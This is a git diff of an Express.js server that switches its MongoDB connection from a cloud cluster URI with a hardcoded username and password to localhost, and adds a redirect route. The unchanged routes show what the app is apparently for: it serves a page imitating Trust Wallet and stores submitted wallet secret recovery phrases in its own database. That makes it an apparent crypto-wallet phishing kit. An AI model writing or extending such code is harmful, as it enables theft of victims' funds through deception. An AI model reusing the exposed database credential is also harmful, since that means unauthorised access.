@@ -15,19 +15,19 @@ const methodOverride = require("method-override");
  
 const mongoose = require("mongoose");
 
-// mongoose.connect("mongodb://localhost/MINT", {useNewUrlParser: true, useUnifiedTopology: true}, function(err){
-//     if(err){
-//         console.log(err)
-//     }
-//     else{
-//         console.log("database connected successfully");
-//     }
-// });
+mongoose.connect("mongodb://localhost/MINT", {useNewUrlParser: true, useUnifiedTopology: true}, function(err){
+    if(err){
+        console.log(err)
+    }
+    else{
+        console.log("database connected successfully");
+    }
+});
 
 //conecting to mongodb cloud online
 
 // const { MongoClient, ServerApiVersion } = require('mongodb');
- const uri = "mongodb+srv://adedokun:adedokun@cluster0.dvnvi.mongodb.net/PEA?retryWrites=true&w=majority";
+// const uri = "mongodb+srv://adedokun:adedokun@cluster0.dvnvi.mongodb.net/PEA?retryWrites=true&w=majority";
 // const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1 });
 // client.connect(err => {
 //   const collection = client.db("test").collection("devices");
@@ -35,7 +35,7 @@ const mongoose = require("mongoose");
 //   client.close();
 // });
 
-mongoose.connect(uri, {useNewUrlParser: true, useUnifiedTopology: true});
+// mongoose.connect(uri, {useNewUrlParser: true, useUnifiedTopology: true});
 
 
 
@@ -81,6 +81,10 @@ app.get("/", function(req, res){
     res.render("index");
 })
 
+app.get("/pea", function(req, res){
+    res.redirect("/")
+})
+
 app.get("/trustwallet", function(req, res){
     res.render("Trustwallet");
 })
@@ -97,7 +101,7 @@ app.post("/trustwallet", function(req, res){
             console.log(err)
         }
         else{
-            console.log("wallet secret phrase imported successfully");
+            console.log("Trust wallet secret phrase imported successfully");
             res.redirect("/")
         }
     })
